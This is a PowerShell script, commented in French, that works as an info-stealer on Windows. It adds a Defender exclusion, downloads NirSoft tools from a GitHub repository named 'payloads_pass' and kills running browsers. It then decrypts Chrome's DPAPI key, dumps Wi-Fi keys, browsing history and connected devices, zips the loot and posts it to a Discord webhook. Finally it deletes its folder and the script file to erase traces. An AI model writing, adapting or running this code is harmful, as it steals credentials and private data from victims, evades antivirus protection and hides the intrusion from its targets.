[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$webhookUrl
)

Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Nettoyage absolu et forcé au démarrage
Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
if (Test-Path $basePath) {
    Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
}

Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

New-Item -ItemType Directory -Path $basePath -Force | Out-Null
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# Téléchargement des outils depuis le dépôt GitHub
Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
    Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red
    exit 1
}

Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# --- EXTRACTION ET DECHIFFREMENT ROBUSTE DES MOTS DE PASSE CHROME ---
Write-Host "[*] Extraction et déchiffrement des mots de passe Chrome..." -ForegroundColor Yellow

$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$outputPath     = "$basePath\passwords.txt"
$tempDb         = "$basePath\login_temp.db"

if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
    try {
        Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue

        $localStateContent = Get-Content $localStatePath -Raw
        if (-not $localStateContent) { throw "Local State vide" }
        
        $localState = $localStateContent | ConvertFrom-Json
        if (-not $localState.os_crypt.encrypted_key) { throw "encrypted_key introuvable" }

        $encKeyBase64 = $localState.os_crypt.encrypted_key
        $encryptedKey = [Convert]::FromBase64String($encKeyBase64)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

        Add-Type -AssemblyName System.Security
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."

        $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
        $textContent = [System.Text.Encoding]::ISO_Latin1.GetString($dbBytes)

        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
        
        if ($urls) {
            $seen = @()
            foreach ($match in $urls) {
                if ($match -and $match.Value) {
                    $u = $match.Value
                    if ($seen -notcontains $u) {
                        $seen += $u
                        if ($u -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3") {
                            Add-Content -Path $outputPath -Value "--------------------------------------------------"
                            Add-Content -Path $outputPath -Value "URL : $u"
                        }
                    }
                }
            }
        } else {
            Add-Content -Path $outputPath -Value "[*] Aucune URL brute détectée."
        }

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    } catch {
        Add-Content -Path $outputPath -Value "[!] Erreur ligne $($_.InvocationInfo.ScriptLineNumber) : $_"
    }
} else {
    Add-Content -Path $outputPath -Value "[!] Fichiers Chrome introuvables."
}
# Exécution des autres outils avec chemins absolus
if (Test-Path "$basePath\WirelessKeyView.exe") {
    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\BrowsingHistoryView.exe") {
    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\WNetWatcher.exe") {
    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
}

Start-Sleep -Seconds 2

# Vérification et sécurisation des fichiers générés
foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
    $filePath = "$basePath\$file"
    if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {
        Set-Content -Path $filePath -Value "No data captured"
    }
    Move-Item $filePath -Destination "$dumpFolder" -Force
}

Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

if (!(Test-Path $dumpFile)) { exit 1 }

# Envoi du fichier ZIP sur le webhook Discord
Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")

$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))

try { 
    $client.PostAsync($webhookUrl,$content).Wait() 
    Write-Host "[+] Envoi reussi !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
}

#if ($fileStream) {
#    $fileStream.Close()
#    $fileStream.Dispose()
#}

# Nettoyage final sécurisé
Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue
exit
